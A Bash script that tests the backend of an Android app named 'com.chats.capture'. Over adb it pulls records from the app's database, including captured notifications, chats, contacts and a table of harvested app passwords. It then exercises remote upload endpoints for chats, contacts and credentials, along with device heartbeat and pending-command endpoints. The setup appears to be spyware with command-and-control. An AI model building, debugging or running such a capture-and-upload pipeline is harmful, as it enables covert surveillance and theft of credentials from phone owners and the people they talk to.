#!/bin/bash

# Comprehensive API Testing & Fix Script
# Fetches data from device, tests all APIs, identifies failures, and provides fixes

set -e

APP_PACKAGE="com.chats.capture"
SERVER_URL="${SERVER_URL:-https://backend-chat-yq33.onrender.com}"
DB_PATH="/data/data/${APP_PACKAGE}/databases/capture_database"
TEMP_DIR="/tmp/api_test_$(date +%s)"
mkdir -p "$TEMP_DIR"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "=========================================="
echo "API Testing & Fix Script"
echo "=========================================="
echo ""
echo "Server URL: $SERVER_URL"
echo "Temp Dir: $TEMP_DIR"
echo ""

# Check device connection
if ! adb devices | grep -q "device$"; then
    echo -e "${RED}❌ No device connected${NC}"
    exit 1
fi

echo -e "${GREEN}✅ Device connected${NC}"
echo ""

# Check if app is installed
if ! adb shell pm list packages | grep -q "$APP_PACKAGE"; then
    echo -e "${RED}❌ App not installed${NC}"
    echo "   Install with: ./gradlew installDebug"
    exit 1
fi

echo -e "${GREEN}✅ App installed${NC}"
echo ""

# Get device ID
echo "📱 Getting device ID..."
DEVICE_ID=$(adb shell "run-as $APP_PACKAGE cat /data/data/$APP_PACKAGE/shared_prefs/device_prefs.xml 2>/dev/null | grep deviceId | sed 's/.*>\(.*\)<.*/\1/' | head -1" 2>/dev/null || echo "")

if [ -z "$DEVICE_ID" ]; then
    echo -e "${YELLOW}⚠️  Device ID not found, will use test ID${NC}"
    DEVICE_ID="test-device-$(date +%s)"
fi

echo "   Device ID: $DEVICE_ID"
echo ""

# Function to query SQLite database
query_db() {
    local query="$1"
    adb shell "run-as $APP_PACKAGE sqlite3 $DB_PATH \"$query\"" 2>/dev/null || echo ""
}

# Check local database
echo "📊 Checking Local Database:"
echo ""

NOTIF_COUNT=$(query_db "SELECT COUNT(*) FROM notifications WHERE synced = 0;" 2>/dev/null || echo "0")
CHAT_COUNT=$(query_db "SELECT COUNT(*) FROM chats WHERE synced = 0;" 2>/dev/null || echo "0")
CONTACT_COUNT=$(query_db "SELECT COUNT(*) FROM contacts WHERE synced = 0;" 2>/dev/null || echo "0")
CREDENTIAL_COUNT=$(query_db "SELECT COUNT(*) FROM credentials WHERE synced = 0;" 2>/dev/null || echo "0")
MEDIA_COUNT=$(query_db "SELECT COUNT(*) FROM media_files WHERE uploadStatus = 'PENDING';" 2>/dev/null || echo "0")

echo "   Unsynced Notifications: $NOTIF_COUNT"
echo "   Unsynced Chats: $CHAT_COUNT"
echo "   Unsynced Contacts: $CONTACT_COUNT"
echo "   Unsynced Credentials: $CREDENTIAL_COUNT"
echo "   Pending Media Files: $MEDIA_COUNT"
echo ""

# Extract sample data from device
echo "📥 Extracting sample data from device..."
echo ""

# Extract notifications
if [ -n "$NOTIF_COUNT" ] && [ "$NOTIF_COUNT" -gt 0 ] 2>/dev/null; then
    echo "   Extracting notifications..."
    query_db "SELECT id, deviceId, appPackage, appName, title, text, timestamp FROM notifications WHERE synced = 0 LIMIT 5;" > "$TEMP_DIR/notifications.txt" 2>/dev/null || true
fi

# Extract chats
if [ -n "$CHAT_COUNT" ] && [ "$CHAT_COUNT" -gt 0 ] 2>/dev/null; then
    echo "   Extracting chats..."
    query_db "SELECT id, deviceId, appPackage, appName, text, timestamp FROM chats WHERE synced = 0 LIMIT 5;" > "$TEMP_DIR/chats.txt" 2>/dev/null || true
fi

# Extract contacts
if [ -n "$CONTACT_COUNT" ] && [ "$CONTACT_COUNT" -gt 0 ] 2>/dev/null; then
    echo "   Extracting contacts..."
    query_db "SELECT id, deviceId, name, phoneNumber, email, timestamp FROM contacts WHERE synced = 0 LIMIT 5;" > "$TEMP_DIR/contacts.txt" 2>/dev/null || true
fi

# Extract credentials
if [ -n "$CREDENTIAL_COUNT" ] && [ "$CREDENTIAL_COUNT" -gt 0 ] 2>/dev/null; then
    echo "   Extracting credentials..."
    query_db "SELECT id, deviceId, accountType, appPackage, appName, email, username, password, timestamp FROM credentials WHERE synced = 0 LIMIT 5;" > "$TEMP_DIR/credentials.txt" 2>/dev/null || true
fi

echo ""

# Test API endpoints
echo "🔍 Testing API Endpoints:"
echo ""

FAILED_APIS=()
PASSED_APIS=()

# Function to test API endpoint
test_api() {
    local method="$1"
    local endpoint="$2"
    local data="$3"
    local description="$4"
    local requires_auth="${5:-false}"
    
    echo -n "   Testing $description... "
    
    local headers=("-H" "Content-Type: application/json")
    if [ "$requires_auth" = "true" ]; then
        # For authenticated endpoints, we'll test without auth first to see the error
        headers+=("-H" "Authorization: Bearer test-token")
    fi
    
    if [ "$method" = "GET" ]; then
        response=$(curl -s -w "\n%{http_code}" -X GET "${SERVER_URL}${endpoint}" \
            "${headers[@]}" 2>&1)
    else
        response=$(curl -s -w "\n%{http_code}" -X "$method" "${SERVER_URL}${endpoint}" \
            "${headers[@]}" \
            -d "$data" 2>&1)
    fi
    
    http_code=$(echo "$response" | tail -1)
    body=$(echo "$response" | sed '$d')
    
    # Consider 200, 201, 400 (validation errors are OK - means endpoint exists), 401 (auth required is OK)
    if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "400" ] || ([ "$http_code" = "401" ] && [ "$requires_auth" = "true" ]); then
        echo -e "${GREEN}✅ OK ($http_code)${NC}"
        PASSED_APIS+=("$description")
        return 0
    else
        echo -e "${RED}❌ FAILED ($http_code)${NC}"
        echo "      Response: $(echo "$body" | head -2 | tr '\n' ' ')"
        FAILED_APIS+=("$description|$http_code|$body")
        return 1
    fi
}

# Test device registration
echo ""
echo "1. Device Registration API:"
test_api "POST" "/api/devices/register" \
    "{\"deviceId\":\"$DEVICE_ID\",\"deviceName\":\"Test Device\",\"model\":\"Test Model\",\"osVersion\":\"Test OS\"}" \
    "POST /api/devices/register"

# Test notifications API
echo ""
echo "2. Notifications API:"
test_api "GET" "/api/notifications?page=1&limit=10" "" "GET /api/notifications" "true"

# Test single notification upload
NOTIF_DATA="{\"id\":\"test-notif-$(date +%s)\",\"deviceId\":\"$DEVICE_ID\",\"appPackage\":\"com.test.app\",\"appName\":\"Test App\",\"title\":\"Test\",\"text\":\"Test notification\",\"timestamp\":$(date +%s)000}"
test_api "POST" "/api/notifications" "$NOTIF_DATA" "POST /api/notifications"

# Test batch notifications
BATCH_NOTIF_DATA="[$NOTIF_DATA]"
test_api "POST" "/api/notifications/batch" "$BATCH_NOTIF_DATA" "POST /api/notifications/batch"

# Test chats API
echo ""
echo "3. Chats API:"
test_api "GET" "/api/chats?page=1&limit=10" "" "GET /api/chats" "true"

# Test single chat upload
CHAT_DATA="{\"id\":\"test-chat-$(date +%s)\",\"deviceId\":\"$DEVICE_ID\",\"appPackage\":\"com.whatsapp\",\"appName\":\"WhatsApp\",\"text\":\"Test message\",\"chatIdentifier\":\"test-chat\",\"timestamp\":$(date +%s)000}"
test_api "POST" "/api/chats" "$CHAT_DATA" "POST /api/chats"

# Test batch chats (with proper structure)
CHAT_DATA_2="{\"id\":\"test-chat-$(date +%s)-2\",\"deviceId\":\"$DEVICE_ID\",\"appPackage\":\"com.whatsapp\",\"appName\":\"WhatsApp\",\"text\":\"Test message 2\",\"chatIdentifier\":\"test-chat-2\",\"timestamp\":$(($(date +%s) + 1))000}"
BATCH_CHAT_DATA="[$CHAT_DATA,$CHAT_DATA_2]"
test_api "POST" "/api/chats/batch" "$BATCH_CHAT_DATA" "POST /api/chats/batch"

# Test contacts API
echo ""
echo "4. Contacts API:"
test_api "GET" "/api/contacts?limit=10" "" "GET /api/contacts" "true"

# Test single contact upload
CONTACT_DATA="{\"deviceId\":\"$DEVICE_ID\",\"name\":\"Test Contact\",\"phoneNumber\":\"+1234567890\",\"timestamp\":$(date +%s)000}"
test_api "POST" "/api/contacts" "$CONTACT_DATA" "POST /api/contacts"

# Test batch contacts
BATCH_CONTACT_DATA="[$CONTACT_DATA]"
test_api "POST" "/api/contacts/batch" "$BATCH_CONTACT_DATA" "POST /api/contacts/batch"

# Test credentials API
echo ""
echo "5. Credentials API:"
test_api "GET" "/api/credentials?limit=10" "" "GET /api/credentials" "true"

# Test single credential upload
CREDENTIAL_DATA="{\"deviceId\":\"$DEVICE_ID\",\"accountType\":\"APP_PASSWORD\",\"appPackage\":\"com.test.app\",\"appName\":\"Test App\",\"email\":\"test@example.com\",\"password\":\"test123\",\"timestamp\":$(date +%s)000}"
test_api "POST" "/api/credentials" "$CREDENTIAL_DATA" "POST /api/credentials"

# Test batch credentials
BATCH_CREDENTIAL_DATA="[$CREDENTIAL_DATA]"
test_api "POST" "/api/credentials/batch" "$BATCH_CREDENTIAL_DATA" "POST /api/credentials/batch"

# Test media API
echo ""
echo "6. Media API:"
test_api "GET" "/api/media?limit=10" "" "GET /api/media" "true"

# Test health endpoint
echo ""
echo "7. Health Check:"
test_api "GET" "/health" "" "GET /health"

# Test device heartbeat
echo ""
echo "8. Device Heartbeat:"
test_api "POST" "/api/devices/$DEVICE_ID/heartbeat" "{}" "POST /api/devices/:deviceId/heartbeat"

# Test pending commands
echo ""
echo "9. Pending Commands:"
test_api "GET" "/api/devices/$DEVICE_ID/commands/pending" "" "GET /api/devices/:deviceId/commands/pending"

echo ""
echo "=========================================="
echo ""
echo "📋 Test Summary:"
echo "   ✅ Passed: ${#PASSED_APIS[@]}"
echo "   ❌ Failed: ${#FAILED_APIS[@]}"
echo ""

if [ ${#FAILED_APIS[@]} -gt 0 ]; then
    echo -e "${RED}Failed APIs:${NC}"
    for api in "${FAILED_APIS[@]}"; do
        IFS='|' read -r desc code body <<< "$api"
        echo "   - $desc (HTTP $code)"
    done
    echo ""
    echo "💡 See FIX_API_ISSUES.md for fixes"
fi

# Cleanup
rm -rf "$TEMP_DIR"

echo ""
echo "💡 Next Steps:"
echo "   1. Review failed APIs above"
echo "   2. Check server logs for errors"
echo "   3. Verify server URL: $SERVER_URL"
echo "   4. Trigger sync: adb shell am broadcast -a com.chats.capture.SYNC_NOW"
echo ""
